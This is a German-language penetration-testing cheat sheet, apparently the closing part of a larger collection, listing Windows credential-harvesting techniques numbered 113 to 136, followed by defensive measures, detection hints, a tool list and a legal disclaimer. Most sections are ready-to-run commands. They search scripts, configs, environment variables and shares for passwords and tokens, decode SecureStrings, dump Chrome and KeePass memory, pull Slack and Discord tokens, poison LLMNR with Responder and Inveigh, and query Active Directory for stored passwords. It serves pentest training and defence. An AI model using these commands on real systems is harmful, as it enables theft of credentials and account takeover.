```cmd
# Scripts durchsuchen
dir C:\*.ps1 /s
findstr /si "ConvertTo-SecureString\|password\|credential" C:\*.ps1

# Common Patterns:
# $password = ConvertTo-SecureString "PlainText" -AsPlainText -Force
```

### 113. Secure Strings in Memory
```powershell
# Secure String Decoding
$secureString = ConvertTo-SecureString "encrypted" -Key (1..16)
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString)
$plaintext = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
```

---

## Bash History (WSL)

**Beschreibung**: Bash History in WSL

### 114. .bash_history
```cmd
# WSL Paths
\\wsl$\Ubuntu\home\<user>\.bash_history
C:\Users\<user>\AppData\Local\Packages\CanonicalGroupLimited*\LocalState\rootfs\home\*\.bash_history

# Content
type \\wsl$\Ubuntu\home\user\.bash_history

# Oft Credentials in Commands wie:
# mysql -u root -p'password123'
# ssh user@host -p password
```

### 115. .zsh_history
```cmd
type \\wsl$\Ubuntu\home\user\.zsh_history
```

### 116. .mysql_history
```cmd
# MySQL History (kann Queries mit Credentials enthalten)
type \\wsl$\Ubuntu\home\user\.mysql_history
```

---

## Clipboard & Sticky Notes

**Beschreibung**: Zwischenablage und Notizen

### 117. Clipboard (PowerShell)
```powershell
# Aktuellen Clipboard Content
Get-Clipboard
```

### 118. Clipboard History (Windows 10+)
```cmd
# Windows Clipboard History ist verschlüsselt, aber:
# Keyboard: Win+V öffnet History GUI
```

### 119. Sticky Notes
```cmd
# Sticky Notes Database
%localappdata%\Packages\Microsoft.MicrosoftStickyNotes_*\LocalState\plum.sqlite

# SQLite Database mit Notizen
```

### 120. OneNote
```cmd
# OneNote Notebooks (können Credentials enthalten)
%userprofile%\Documents\OneNote Notebooks\
```

---

## Environment Variables

**Beschreibung**: Credentials in Umgebungsvariablen

### 121. set / printenv
```cmd
# Alle Environment Variables
set

# Spezifische suchen
set | findstr /i "password key token secret api"

# System Environment Variables
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /s
```

### 122. PowerShell Environment
```powershell
# Alle Environment Variables
Get-ChildItem Env:

# Filtern
Get-ChildItem Env: | Where-Object {$_.Name -like "*password*" -or $_.Name -like "*token*" -or $_.Name -like "*key*"}
```

---

## Application Memory Dumps

**Beschreibung**: Credentials aus Application Memory

### 123. ProcDump (Application Dump)
```cmd
# Beliebigen Prozess dumpen
procdump.exe -ma <PID> output.dmp

# Beispiele:
procdump.exe -ma chrome.exe chrome.dmp
procdump.exe -ma KeePass.exe keepass.dmp
```

### 124. Strings Analysis
```cmd
# Strings aus Memory Dump extrahieren
strings64.exe -n 8 chrome.dmp > chrome_strings.txt

# Credentials suchen
findstr /i "password username token api" chrome_strings.txt
```

---

## Network Sniffing

**Beschreibung**: Credentials aus Netzwerk-Traffic

### 125. Wireshark / tshark
```cmd
# HTTP Credentials
tshark -r capture.pcap -Y "http.authorization"

# FTP Credentials
tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS"

# SMB
tshark -r capture.pcap -Y "smb"
```

### 126. Responder (LLMNR Poisoning)
```bash
# LLMNR/NBT-NS/MDNS Poisoning
responder -I eth0 -wrf

# Captured Hashes in:
# Responder/logs/
```

### 127. Inveigh (PowerShell)
```powershell
# Windows Network Poisoning
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
```

---

## File Shares & Recent Files

**Beschreibung**: Credentials in Shares und Recent Files

### 128. Recent Files
```cmd
# Recent Documents
%appdata%\Microsoft\Windows\Recent\

# JumpList (Recent Items)
%appdata%\Microsoft\Windows\Recent\AutomaticDestinations\
%appdata%\Microsoft\Windows\Recent\CustomDestinations\

# Kann Shares mit Credentials zeigen
```

### 129. Network Shares
```cmd
# Aktuelle Verbindungen
net use

# Mapped Drives
net use | findstr /i ":"

# Shares durchsuchen nach Credential Files
dir \\fileserver\share\*.txt /s | findstr /i "password credential"
```

---

## Tokens (OAuth, JWT, API Keys)

**Beschreibung**: Application Tokens und API Keys

### 130. Browser DevTools / LocalStorage
```cmd
# Chrome LocalStorage
%localappdata%\Google\Chrome\User Data\Default\Local Storage\leveldb\

# Edge
%localappdata%\Microsoft\Edge\User Data\Default\Local Storage\leveldb\

# Enthält oft JWT Tokens, API Keys
```

### 131. Application Configs
```cmd
# Durchsuche alle Configs nach Tokens
findstr /si "api_key\|apikey\|token\|bearer\|jwt" C:\*.json
findstr /si "api_key\|apikey\|token\|bearer\|jwt" C:\*.xml
findstr /si "api_key\|apikey\|token\|bearer\|jwt" C:\*.yaml
findstr /si "api_key\|apikey\|token\|bearer\|jwt" C:\*.conf
```

### 132. Slack Tokens
```cmd
# Slack Desktop App
%appdata%\Slack\storage\slack-downloads
%appdata%\Slack\Cookies

# Slack Tokens (xoxp-, xoxb-, xoxa-)
findstr /si "xoxp-\|xoxb-\|xoxa-" %appdata%\Slack\*
```

### 133. Discord Tokens
```cmd
# Discord Tokens
%appdata%\discord\Local Storage\leveldb\

# Token Pattern
findstr /si "mfa\.[a-zA-Z0-9_-]{84}" %appdata%\discord\Local Storage\leveldb\*
```

---

## Active Directory Attributes

**Beschreibung**: Credentials in AD User Attributes

### 134. LDAP Queries
```powershell
# User Description Field (oft Passwords!)
Get-ADUser -Filter * -Properties Description | Where-Object {$_.Description -ne $null}

# Info Field
Get-ADUser -Filter * -Properties Info | Where-Object {$_.Info -ne $null}

# All Attributes
Get-ADUser username -Properties *
```

### 135. BloodHound / SharpHound
```powershell
# AD Enumeration (kann Credential Attributes finden)
SharpHound.exe -c All

# BloodHound Queries für Kerberoastable Accounts
```

### 136. PowerView AD
```powershell
# Users mit interessanten Attributen
Get-DomainUser | Where-Object {$_.Description -like "*password*"}

# SPN Accounts (Kerberoastable)
Get-DomainUser -SPN
```

---

## Defensive Maßnahmen

### Schutz vor Credential Theft:

1. **Credential Guard aktivieren** (LSASS Schutz)
2. **DPAPI mit TPM** verwenden
3. **LSA Protection** aktivieren
4. **Restricted Admin Mode** für RDP
5. **Keine Plaintext Passwords** in Configs/Scripts
6. **Encrypted Secrets** (Azure Key Vault, AWS Secrets Manager)
7. **Multi-Factor Authentication** (MFA)
8. **Principle of Least Privilege**
9. **Regular Credential Rotation**
10. **EDR/XDR Solutions**

### Detection:

- **Sysmon**: Event ID 10 (Process Access) für LSASS
- **Windows Event Logs**: Security Event 4688, 4624
- **PowerShell Logging**: Module/Script Block Logging
- **File Integrity Monitoring**: Überwachung von SAM/SYSTEM/SECURITY
- **Network Monitoring**: Anomale Kerberos Requests

---

## Tools Zusammenfassung

### Top 10 Tools für Credential Harvesting:

1. **LaZagne** - All-in-One Credential Harvester
2. **Mimikatz** - LSASS, Kerberos, DPAPI, Certificates
3. **SharpDPAPI** - DPAPI Secrets Extraction
4. **Impacket secretsdump** - SAM, NTDS.dit, Remote
5. **Rubeus** - Kerberos Abuse (Kerberoasting, ASREPRoast)
6. **SessionGopher** - Saved Sessions (Putty, WinSCP, RDP)
7. **SharpChrome/SharpWeb** - Browser Credentials
8. **NirSoft Suite** - WebBrowserPassView, MailPassView, WirelessKeyView
9. **CrackMapExec** - Remote Credential Dumping
10. **PowerSploit/PowerView** - AD Enumeration

---

## Wichtige Hinweise

- **Admin-Rechte**: Die meisten Methoden erfordern lokale Admin- oder SYSTEM-Rechte
- **EDR Detection**: Viele Tools werden von modernen EDR-Lösungen erkannt
- **Encryption**: DPAPI, verschlüsselte Databases benötigen Master Keys
- **OPSEC**: Vorsicht bei Logging (PowerShell, Sysmon, Event Logs)

---

## Rechtliche Hinweise

Diese Methoden dürfen NUR verwendet werden für:
- Autorisierte Penetrationstests mit schriftlicher Genehmigung
- CTF-Wettbewerbe und Security Challenges
- Forensische Analysen auf eigenen Systemen
- Sicherheitsforschung in kontrollierten Umgebungen
- Defensive Security und Incident Response

Unbefugte Nutzung verstößt gegen CFAA (USA), Computer Misuse Act (UK), StGB §202a-c (DE) und ähnliche Gesetze weltweit.

---

**Erstellt**: 2025-10-30
**Kontext**: Autorisierter Penetrationstest / OSCP Vorbereitung
**Total Methods**: 136+
